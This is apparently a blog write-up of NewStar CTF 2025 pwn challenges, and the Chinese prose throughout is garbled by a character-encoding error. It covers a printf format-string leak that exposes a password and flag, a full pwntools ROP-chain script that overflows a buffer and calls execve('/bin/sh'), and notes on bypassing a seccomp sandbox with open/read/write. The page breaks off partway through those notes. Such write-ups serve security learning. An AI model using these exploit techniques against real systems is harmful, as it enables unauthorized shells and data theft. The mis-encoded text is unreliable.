æ¥å§è®©æˆ‘çœ‹çœ‹ä½ çš„è¾“å…¥</span><br></pre></td></tr></table></figure><p>x86-64 çš„æ£§åƒæ•¸ç”¨å¯„å­˜å™¨çš„</p><h3 id="x86-64-SysV-è°ƒç”¨çº¦å®š"><a href="#x86-64-SysV-è°ƒç”¨çº¦å®š" class="headerlink" title="x86-64 SysV è°ƒç”¨çº¦å®š"></a>x86-64 SysV è°ƒç”¨çº¦å®š</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">printf çš„å˜å‚é¡ºåºï¼ˆå¸¦ $ çš„ä½ç½®ç´¢å¼•ï¼‰æ˜¯ï¼š</span><br><span class="line">1$çš„ä½ç½®ç´¢å¼•ï¼‰æ˜¯ï¼š1 çš„ä½ç½®ç´¢å¼•ï¼‰æ˜¯ï¼š</span><br><span class="line">1â†’RSIï¼Œ2$â†’RDXï¼Œ3$â†’RCXï¼Œ4$â†’R8ï¼Œ5$â†’R9ï¼Œ6$ èµ·åœ¨æ ˆä¸Š(ç¬¬ 6 ä¸ªæ§½)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ ˆä¸Šçš„å‚æ•°æ§½ä»æ ˆé¡¶å¾€ä¸‹æ•°ï¼Œç¬¬ä¸€ä¸ªæ§½æ˜¯ 0ï¼Œç¬¬äºŒä¸ªæ˜¯ 1ï¼Œä¾æ¬¡ç±»æ¨ã€‚æ‰€ä»¥ï¼ŒæŒ‡å‘å¯†ç çš„æŒ‡é’ˆæ‰€åœ¨çš„æ§½ä½æ˜¯ä»æ ˆé¡¶å¾€ä¸‹æ•°çš„ç¬¬ 18 ä¸ªæ§½ï¼Œä¹Ÿå°±æ˜¯ç¬¬ 18$ ä¸ªå‚æ•°</p><p>æ ˆé¡¶:0x7ffc4ced35c0</p><p>å¯†ç :0x7ffc4ced3650</p><p>0x3650 - 0x35c0 &#x3D; 0x90 &#x3D; 18 * 8</p><p>æ ˆä¸Šç¬¬ä¸€ä¸ªå˜å‚æ˜¯ 6$  ,6+18 &#x3D; 24 </p><p>printf(%24$p)ï¼šå¯†ç çš„åœ°å€</p><p>printf(%24$s)ï¼šå¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">%24$p</span><br><span class="line">printfç¬¬ 1 æ¬¡å¯åŠ¨!</span><br><span class="line">0x7ffc8ae5aa00</span><br><span class="line"></span><br><span class="line">å†æ¥ä¸€æ¬¡ !</span><br><span class="line">%24$s</span><br><span class="line">printfç¬¬ 2 æ¬¡å¯åŠ¨!</span><br><span class="line">HQFPFOLAOVDOHLH</span><br><span class="line"></span><br><span class="line">ç°åœ¨æ¥éªŒè¯ä¸€ä¸‹å¯†ç å§ ( â¼Ì´Ì€ .Ì« â¼Ì´ )âœ§ï¼è¾“å…¥ä½ çš„å¯†ç ï¼š</span><br><span class="line">HQFPFOLAOVDOHLH</span><br><span class="line">ç°åœ¨æ¥éªŒè¯ä¸€ä¸‹å¯†ç çš„æŒ‡é’ˆå§ ( â¼Ì´Ì€ .Ì« â¼Ì´ )âœ§ï¼è¾“å…¥ä½ çš„å¯†ç ï¼š</span><br><span class="line">ç»™æˆ‘è¾“å…¥ä¸€ä¸ªç±»ä¼¼ 0x114514 çš„ 16 è¿›åˆ¶æ•°!</span><br><span class="line">0x7ffc8ae5aa00</span><br><span class="line">å¥½æ£’ Ì‹(à¹‘ËƒÌê‡´Ë‚Ì€à¹‘) ç»™ä½ flag</span><br><span class="line">flag&#123;ead08abf-89e2-4248-84fe-f656f0c5379e&#125;</span><br></pre></td></tr></table></figure><h2 id="2-syscall"><a href="#2-syscall" class="headerlink" title="2.syscall"></a>2.syscall</h2><p>checksecä¸€ä¸‹ , é–‹äº†NXå’ŒCanaryä¿è­·: </p><p>æ”»æ“Šæ–¹æ³•ROPéˆ+Canaryç¹é</p><img src="4a881a14f1184d80c6e74e26c25cc738.png" alt="screen-capture.png"  /><p>fileä¸€ä¸‹, 32ä½</p><img src="0b82e5e1632732ea4a14faafc1bb95a8.png" alt="screen-capture.png"  /><img src="d5e734c3457ee153572f9afd3afe26f3.png" alt="screen-capture.png"  /><p>vmmapä¸€ä¸‹syscall å¯å¯«çš„æ˜¯0x80ef000  åœ¨IDAæŸ¥çœ‹æ˜¯BSSæ®µ , å› ç‚ºæ²’æœ‰æ‰¾åˆ°&#x2F;bin&#x2F;sh , </p><p>æ‰€ä»¥å¯ä»¥åœ¨bssæ®µå¯«å…¥â€&#x2F;bin&#x2F;sh\x00â€  , èª¿ç”¨execve(â€œ&#x2F;bin&#x2F;shâ€ , 0 , 0)</p><p>çœ‹çœ‹å½ä»£ç¢¼:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  init(&amp;argc);</span><br><span class="line">  _libc_write(1, &quot;welcome to newstarctf2025 week2!\n&quot;, 33);</span><br><span class="line">  _libc_write(1, &quot;pwn it guys!\n&quot;, 13);</span><br><span class="line">  func();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int func()</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v1[14]; // [esp+6h] [ebp-12h] BYREF</span><br><span class="line"></span><br><span class="line">  return _libc_read(0, v1, 100);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0x12+4 &#x3D; 18  </p><p>åœ¨è¿”å›åœ°å€(0xffffc63c)ä¹‹å‰æ²¡æœ‰çœ‹åˆ°canaryå€¼  , æ‰€ä»¥å¯ä»¥ä¸ç”¨çœ‹canary </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">(py311) ghsc@DESKTOP-JDO3EH1:~/NewStar2025/pwn$ ROPgadget --binary syscall  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br><span class="line">0x080ad56a : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080b438a : pop eax ; ret</span><br><span class="line">0x080ad569 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">(py311) ghsc@DESKTOP-JDO3EH1:~/NewStar2025/pwn$ ROPgadget --binary syscall  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br><span class="line">0x080ad572 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080ad56a : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806d7e1 : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08073656 : pop ebp ; pop edi ; pop ebx ; ret</span><br><span class="line">0x080ada1c : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x0804993a : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0806064c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x080abda5 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08049a1e : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0804fbfe : pop ebx ; pop esi ; ret</span><br><span class="line">0x08049022 : pop ebx ; ret</span><br><span class="line">0x0806071f : pop ebx ; ret 4</span><br><span class="line">0x0806cd8e : pop edi ; pop ebx ; ret</span><br><span class="line">0x08064cbb : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x080ad569 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08064cbc : pop esi ; pop ebx ; ret</span><br><span class="line">0x0806cd8d : pop esi ; pop edi ; pop ebx ; ret</span><br><span class="line">0x08072eb4 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">(py311) ghsc@DESKTOP-JDO3EH1:~/NewStar2025/pwn$ ROPgadget --binary syscall  --only &#x27;pop|ret&#x27; | grep &#x27;ecx&#x27;</span><br><span class="line">0x0804985a : pop ecx ; ret</span><br><span class="line">(py311) ghsc@DESKTOP-JDO3EH1:~/NewStar2025/pwn$ ROPgadget --binary syscall  --only &#x27;pop|ret&#x27; | grep &#x27;edx&#x27;</span><br><span class="line">0x0804985c : pop edx ; ret</span><br></pre></td></tr></table></figure><p>0x080b438a : pop eax ; ret</p><p>0x08049022 : pop ebx ; ret</p><p>0x0804985a : pop ecx ; ret</p><p>0x0804985c : pop edx ; ret</p><p>payload ç¬¬ä¸€æ­¥è¦è‡ªå…ˆåŠ ä¸Šåƒåœ¾æ•¸æ“šå†åŠ ä¸Šreadå‡½æ•¸(0x3) </p><p>read(b , c , d):</p><p>ebx - æ–‡ä»¶æè¿°ç¬¦ (fd)<br>ecx - ç¼“å†²åŒºåœ°å€ (buf)<br>edx - è¯»å–å­—èŠ‚æ•° (count)</p><p>int 0x80 åé¢æœ€å¥½è·Ÿç€ retï¼Œè¿™æ˜¯ä¸ºäº†ä¿æŒROPé“¾çš„è¿ç»­æ€§</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop eax â†’ pop ebx â†’ pop ecx â†’ pop edx â†’ int 0x80 â†’ ??? (æ§åˆ¶æµä¸¢å¤±)</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop eax â†’ pop ebx â†’ pop ecx â†’ pop edx â†’ int 0x80 ; ret â†’ ä¸‹ä¸€ä¸ªgadget</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥æ‰¾ int 0x80 ; ret  gadget</span><br><span class="line">ROPgadget --binary syscall --only &#x27;int&#x27; | grep &#x27;ret&#x27;</span><br><span class="line">ROPgadget --binary syscall | grep &#x27;int 0x80&#x27; | grep &#x27;ret&#x27;</span><br></pre></td></tr></table></figure><p>é€™ä¸€é¡ŒROPgadgetæ‰¾ä¸åˆ°((((((</p><p>åœ¨pwn å¤§ä½¬çš„æŒ‡å°ä¸‹åœ¨IDAæ‰¾åˆ°äº† , alt + b  æŸ¥æ‰¾ cd 80 (int 0x80)</p><img src="16032a9cd3d793522eac631cff26843d.png" alt="screen-capture.png"  /><p>int 0x80 (0x08073A00)</p><p>å› ç‚ºæœ‰NX , è¦æ£§å°é½Šä¸€ä¸‹  , åŠ ä¸€å€‹ret </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary syscall --only &quot;ret&quot;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># nc 8.147.134.121 20502</span></span><br><span class="line">p=process(<span class="string">&quot;./syscall&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./syscall&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;8.147.134.121&#x27;,20502)</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;pwn it guys!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss_addr = elf.bss() + <span class="number">0x100</span>  <span class="comment"># é¿å…å†²çª</span></span><br><span class="line">read_addr = <span class="number">0x3</span></span><br><span class="line">execve = <span class="number">0xb</span> </span><br><span class="line">pop_eax = <span class="number">0x080b438a</span></span><br><span class="line">pop_ebx = <span class="number">0x08049022</span></span><br><span class="line">pop_ecx = <span class="number">0x0804985a</span></span><br><span class="line">pop_edx = <span class="number">0x0804985c</span></span><br><span class="line">int_0x80 = <span class="number">0x08073A00</span></span><br><span class="line">ret = <span class="number">0x0804900e</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x12</span>+<span class="number">4</span>)  <span class="comment">#_BYTE v1[14]; // [esp+6h] [ebp-12h] BYREF  0x12+4</span></span><br><span class="line">payload += p32(ret) </span><br><span class="line">payload += p32(pop_eax)</span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(pop_ebx)    <span class="comment"># readå‡½æ•°è¿”å›åçš„åœ°å€</span></span><br><span class="line">payload += p32(<span class="number">0</span>) </span><br><span class="line">payload += p32(pop_ecx)         <span class="comment"># fd = 0 (stdin)</span></span><br><span class="line">payload += p32(bss_addr)   <span class="comment"># bufåœ°å€</span></span><br><span class="line">payload += p32(pop_edx)</span><br><span class="line">payload += p32(<span class="number">8</span>)          <span class="comment"># è¯»å–é•¿åº¦</span></span><br><span class="line">payload += p32(int_0x80)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¬¬äºŒé˜¶æ®µï¼šexecve(&quot;/bin/sh&quot;, NULL, NULL)</span></span><br><span class="line">payload += p32(pop_eax)</span><br><span class="line">payload += p32(execve) <span class="comment"># ç³»ç»Ÿè°ƒç”¨å·</span></span><br><span class="line">payload += p32(pop_ebx)</span><br><span class="line">payload += p32(bss_addr)   <span class="comment"># &quot;/bin/sh&quot;å­—ç¬¦ä¸²åœ°å€</span></span><br><span class="line">payload += p32(pop_ecx)</span><br><span class="line">payload += p32(<span class="number">0</span>)          <span class="comment"># argv = NULL</span></span><br><span class="line">payload += p32(pop_edx)  </span><br><span class="line">payload += p32(<span class="number">0</span>)          <span class="comment"># envp = NULL</span></span><br><span class="line">payload += p32(int_0x80)   <span class="comment"># è§¦å‘ç³»ç»Ÿè°ƒç”¨</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”¨IDAæ‰¾çš„()gdb.attach(p) </p><img src="9efeb14811e92550e1e3ffd36576ce4b.png" alt="screen-capture.png"  /><p>ç”¨ROPgadgetæ‰¾çš„(éŒ¯çš„æ­»å¾ªç¯int)gdb.attach(p)</p><img src="a92502d584b22948308a9e4d5d2d3e34.png" alt="screen-capture.png"  /><p>ä¸ç®¡äº† , åæ­£åšå‡ºä¾†äº† !!(0v0)!!</p><h2 id="3-no-shell"><a href="#3-no-shell" class="headerlink" title="3.no shell"></a>3.no shell</h2><p>sandbox  é€™æ˜¯ä¸€é¡Œæ²™ç›’é¡Œ , </p><p>hintï¼šä¸ºä»€ä¹ˆå‡å®šè¦ rax çš„å€¼å‘¢ï¼Œæˆ–è®¸å¯ä»¥åœ¨ä¸çŸ¥é“å…·ä½“å€¼çš„æƒ…å†µä¸‹ä¼ é€’</p><p>çœ‹çœ‹checksecå…ˆ</p><img src="614104792a8abf8396f786753f5607a6.png" alt="screen-capture.png"  /><p>ç”¨ä¸€ä¸‹æ²™ç›’ </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./noshell</span><br></pre></td></tr></table></figure><img src="e54fd124f29b1e9523b08f59460e65a0.png" alt="screen-capture.png"  /><p>å¯ä»¥çœ‹è¦‹ä¸å¯ä»¥ç”¨execve , ARCH_X86_64 , A!&#x3D;0xffffffff äº† return KILL </p><p>å¦‚æœA&lt;0x40000000 å°±å¯ä»¥ALLOW </p><p>å¯ä»¥å…ˆçœ‹æ¦‚è«– :<br><a href="https://">https://www.bilibili.com/video/BV1Wi4y1A7Gr/?spm_id_from&#x3D;333.337.search-card.all.click&amp;vd_source&#x3D;b128d59725d91ecef706ce0b01795a8f</a></p><p>ç¹é:</p><p><a href="https://">https://www.bilibili.com/video/BV1Uv411j7fr?spm_id_from&#x3D;333.788.videopod.episodes&amp;vd_source&#x3D;b128d59725d91ecef706ce0b01795a8f&amp;p&#x3D;16</a></p><p>æ²™ç®±!!! çœæµ:</p><h3 id="Secure-computing-mode"><a href="#Secure-computing-mode" class="headerlink" title="Secure computing mode"></a>Secure computing mode</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.Seccomp restrict</span><br><span class="line">2.Seccomp filter</span><br><span class="line">3.ä½¿ç”¨prctlè¨­ç½®sandbox</span><br><span class="line">4.ä½¿ç”¨seccomp.hè¨­ç½®sandbox</span><br><span class="line">5.ä½¿ç”¨libseccompè¨­ç½®sandbox</span><br></pre></td></tr></table></figure><h3 id="ç¹éæ€è·¯"><a href="#ç¹éæ€è·¯" class="headerlink" title="ç¹éæ€è·¯"></a>ç¹éæ€è·¯</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ORW</span><br><span class="line">  Open/openv</span><br><span class="line">  Read/readv</span><br><span class="line">  Write/writev</span><br></pre></td></tr></table></figure><p>i386èˆ‡x86-64çš„èª¿ç”¨è™Ÿä¸åŒ</p><p>å¯ä»¥åˆ©ç”¨retqæŒ‡ä»¤ä¿®æ”¹cså¯„å­˜å™¨</p><p>cs &#x3D;&#x3D; 0x23 ä»£è¡¨32ä½æ¨¡å¼ </p><p>cs &#x3D;&#x3D; 0x33 ä»£è¡¨64ä½æ¨¡å¼</p><p>å¯èƒ½æ˜¯64è½‰æˆ32ä½ç¹é</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 n2; // rax</span><br><span class="line">  __int64 n2_1; // [rsp+8h] [rbp-108h] BYREF</span><br><span class="line">  _BYTE buf[256]; // [rsp+10h] [rbp-100h] BYREF</span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  write(1, &quot;Your Power Has Been Restricted!\n&quot;, 0x20u);</span><br><span class="line">  write(1, &quot;But your mind is still free!\n&quot;, 0x1Du);</span><br><span class="line">  write(1, &quot;Do you want to say something?\n&quot;, 0x1Eu);</span><br><span class="line">  if ( getchar() == 121 || getchar() == 89 )</span><br><span class="line">  &#123;</span><br><span class="line">    read(0, buf, 0xFFu);</span><br><span class="line">    buf[255] = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    write(1, &quot;You chose not to say anything.\n&quot;, 0x20u);</span><br><span class="line">  &#125;</span><br><span class="line">  write(1, &quot;leave or capture the flag?\n&quot;, 0x1Cu);</span><br><span class="line">  __isoc99_scanf(&quot;%lld&quot;, &amp;n2_1);</span><br><span class="line">  if ( n2_1 &lt;= 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    n2 = 1;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    n2 = n2_1;</span><br><span class="line">    if ( n2_1 &gt; 2 )</span><br><span class="line">      n2 = 2;</span><br><span class="line">  &#125;</span><br><span class="line">  n2_1 = n2;</span><br><span class="line">  if ( n2 == 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    write(1, &quot;You chose to leave.\n&quot;, 0x14u);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( n2_1 == 2 )</span><br><span class="line">    write(1, &quot;You chose to capture the flag!\n&quot;, 0x1Fu);</span><br><span class="line">  challenge();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">void __noreturn challenge()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // [rsp+Ch] [rbp-4h] BYREF</span><br><span class="line"></span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    write(1, &quot;Welcome to the challenge!\n&quot;, 0x1Au);</span><br><span class="line">    write(1, &quot;Please Make choice:\n&quot;, 0x14u);</span><br><span class="line">    write(1, &quot;1. Check your power\n&quot;, 0x14u);</span><br><span class="line">    write(1, &quot;2. Get the power of your cat\n&quot;, 0x18u);</span><br><span class="line">    write(1, &quot;3. Open the door\n&quot;, 0x11u);</span><br><span class="line">    write(1, &quot;4. Destroy this world\n&quot;, 0x16u);</span><br><span class="line">    write(1, &quot;5. leave this world\n&quot;, 0x14u);</span><br><span class="line">    write(1, &quot;your choice: &quot;, 0xDu);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v0);</span><br><span class="line">    switch ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1:</span><br><span class="line">        Check_your_power();</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        Get_the_power_of_your_cat();</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        open_the_door();</span><br><span class="line">        break;</span><br><span class="line">      case 4:</span><br><span class="line">        destroy_this_world();</span><br><span class="line">        break;</span><br><span class="line">      case 5:</span><br><span class="line">        write(1, &quot;Goodbye!\n&quot;, 9u);</span><br><span class="line">        exit(0);</span><br><span class="line">      default:</span><br><span class="line">        write(1, &quot;Invalid choice!\n&quot;, 0x10u);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¼æ´ç‚¹ï¼šmain ä¸­çš„ read(0, buf, 0xFFu) å’Œ Check_your_power() ä¸­çš„ read(0, buf, off)</p><img src="3f60105557699cd108270e6098530c9e.png" alt="cab6d0c5-9697-4bcf-8d1b-e9a9eab14100.png"  /><h3 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h3><p>åƒè€ƒæ–‡ç« :<br><a href="https://x1ng.top/2021/10/28/pwn-orw%E6%80%BB%E7%BB%93/">https://x1ng.top/2021/10/28/pwn-orw%E6%80%BB%E7%BB%93/</a></p><p>çœæµ:</p><br/><ol><li>Openç³»çµ±å‘¼å«<br>ç³»çµ±å‘¼å«è™Ÿï¼š2ï¼ˆåœ¨x86-64ä¸­ï¼Œopençš„ç³»çµ±å‘¼å«è™Ÿæ˜¯2ï¼‰<br>åƒæ•¸ï¼š</li></ol><p>rdi: æª”æ¡ˆè·¯å¾‘çš„å­—ä¸²æŒ‡æ¨™ï¼ˆä¾‹å¦‚ï¼šå­—ä¸²â€flagâ€çš„åœ°å€ï¼‰</p><p>rsi: æ‰“é–‹æª”æ¡ˆçš„æ¨™èªŒï¼ˆä¾‹å¦‚ï¼šO_RDONLY&#x3D;0ï¼‰</p><p>rdx: æ¨¡å¼ï¼ˆé€šå¸¸åœ¨ä½¿ç”¨O_CREATæ™‚éœ€è¦ï¼Œé€™è£¡å¯ä»¥è¨­ç‚º0ï¼‰</p><p>æˆåŠŸåŸ·è¡Œå¾Œï¼Œraxæœƒè¿”å›æª”æ¡ˆæè¿°ç¬¦ï¼ˆé€šå¸¸æ˜¯ä¸€å€‹éè² æ•´æ•¸ï¼Œä¾‹å¦‚3ï¼‰ã€‚</p><ol start="2"><li>Readç³»çµ±å‘¼å«<br>ç³»çµ±å‘¼å«è™Ÿï¼š0<br>åƒæ•¸ï¼š</li></ol><p>rdi: æª”æ¡ˆæè¿°ç¬¦ï¼ˆå¾openè¿”å›çš„fdï¼‰</p><p>rsi: è®€å–å…§å®¹å­˜æ”¾çš„ç·©è¡å€åœ°å€</p><p>rdx: è¦è®€å–çš„ä½å…ƒçµ„æ•¸</p><p>æˆåŠŸåŸ·è¡Œå¾Œï¼Œraxè¿”å›å¯¦éš›è®€å–çš„ä½å…ƒçµ„æ•¸ã€‚</p><ol start="3"><li>Writeç³»çµ±å‘¼å«<br>ç³»çµ±å‘¼å«è™Ÿï¼š1<br>åƒæ•¸ï¼š</li></ol><p>rdi: æª”æ¡ˆæè¿°ç¬¦ï¼ˆé€™è£¡æˆ‘å€‘è¦è¼¸å‡ºåˆ°æ¨™æº–è¼¸å‡ºï¼Œæ‰€ä»¥æ˜¯1ï¼‰</p><p>rsi: è¦å¯«å…¥çš„è³‡æ–™çš„ç·©è¡å€åœ°å€ï¼ˆä¹Ÿå°±æ˜¯readè®€å–åˆ°çš„ç·©è¡å€ï¼‰</p><p>rdx: 